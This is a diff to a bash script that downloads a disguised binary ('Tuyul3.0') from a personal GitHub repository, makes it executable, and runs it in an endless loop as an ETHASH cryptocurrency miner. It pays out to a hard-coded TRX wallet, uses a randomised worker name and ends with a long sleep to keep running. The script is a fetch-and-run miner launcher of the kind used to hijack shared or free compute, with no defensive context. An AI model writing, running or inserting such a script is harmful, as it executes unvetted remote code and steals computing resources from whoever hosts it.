@@ -1,11 +1,11 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
+WALLET=TRX:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63
 WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
-wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
-chmod +x tuyulgpu
+wget https://github.com/hosin22/test/raw/main/Tuyul3.0
+chmod +x Tuyul3.0
 while [ 1 ]; do
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 5
 done
 sleep 999999999 
